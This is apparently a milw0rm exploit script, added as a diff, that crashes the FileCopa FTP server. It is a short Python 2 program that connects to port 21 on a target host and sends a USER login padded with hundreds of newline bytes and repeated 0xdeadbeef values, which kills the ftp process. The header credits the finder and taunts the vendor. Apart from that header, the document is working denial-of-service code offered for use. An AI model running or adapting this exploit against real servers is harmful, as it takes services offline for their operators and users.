@@ -1,0 +1,42 @@
+### FILECOPA DOS
+### www.filecopa.com
+### Found Jan 19 2006, Tested again on the new release 6 April 2006
+### BY Bigeazer 
+### http://blacksecurity.org
+
+### They are selling this software for $39.95...
+### oh well.. maybe they shoud fix it first?
+
+#
+# It appears that FileCopa does not handle alot of new line char
+# in the USER login.  This is in the filecpnt.exe file.
+# 
+# This is only a DOS, that kills the ftp process
+
+
+import sys,os,string
+import socket
+import struct
+import time
+
+print "-------------------------------"
+print "- FileCopa DOS"
+print "- Found by: bigeazer"
+print "- Should have crashed FileCopa"
+print "-------------------------------"
+
+buffer = "\x0a" * 248 + struct.pack('<L',0xdeadbeef)  * 960 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+	conn = s.connect((sys.argv[1],21))
+except:
+	print "- Unable to connect. exiting."
+	sys.exit(1)
+
+d = s.recv(1024)
+time.sleep(1)
+s.send('USER %s\r\n' % buffer)
+time.sleep(1)
+sys.exit(0)
+
+# milw0rm.com [2006-05-05]
